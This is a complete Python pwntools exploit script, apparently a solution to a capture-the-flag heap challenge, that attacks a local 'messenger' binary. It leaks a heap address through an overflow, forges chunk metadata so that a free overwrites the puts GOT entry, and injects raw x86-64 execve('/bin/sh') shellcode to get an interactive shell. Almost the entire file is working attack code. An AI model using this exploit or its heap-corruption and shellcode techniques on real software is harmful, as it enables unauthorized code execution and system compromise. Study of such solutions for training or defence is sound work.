#!/usr/bin/env python
# -*- coding: utf8 -*-
from pwn import * # pip install pwntools
import sys

r = process('./messenger')

def leave(size, msg):
    r.recvuntil('>>')
    r.sendline('L')
    r.recvuntil('size :')
    r.sendline(str(size))
    r.recvuntil('msg :')
    r.sendline(msg)

def change(idx, size, payload):
    r.recvuntil('>>')
    r.sendline('C')
    r.recvuntil('index :')
    r.sendline(str(idx))
    r.recvuntil('size :')
    r.sendline(str(size))
    r.recvuntil('msg :')
    r.send(payload)

def view(idx):
    r.recvuntil('>>')
    r.sendline('V')
    r.recvuntil('index :')
    r.sendline(str(idx))

def remove(idx):
    r.recvuntil('>>')
    r.sendline('R')
    r.recvuntil('index :')
    r.sendline(str(idx))

puts_got = 0x602018

# Leak top chunk
leave(8, 'A'*4)
change(0, 60, 'A'*40)
view(0)
r.recvuntil('A'*40)
x = r.recvline()[:-1]
heap = u64(x + '\x00'*(8-len(x))) - 0x18
log.info('heap : {}'.format(hex(heap)))

# Repair the heap struct
payload = 'A'*8 + p64(0)*2 + p64(0x3d0) + p64(0) + p64(heap+0x18)
change(0, 60, payload)

# Make another chunk and use overflow to make arbitratary free
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
leave(8, 'B'*4)
payload = 'A'*8
payload += p64(0)*2 + p64(0x31) + p64(heap+0xa8) + p64(puts_got-8)
payload += 'B'*8 + p64(0)*2 + p64(0x3a0) + p64(0) + p64(heap+0x48)
payload += p64(0)*3 + '\xeb\x16' +'\x00'*6 + p64(0)*2 + sc
change(0, len(payload)+4, payload)
remove(1)

r.interactive()
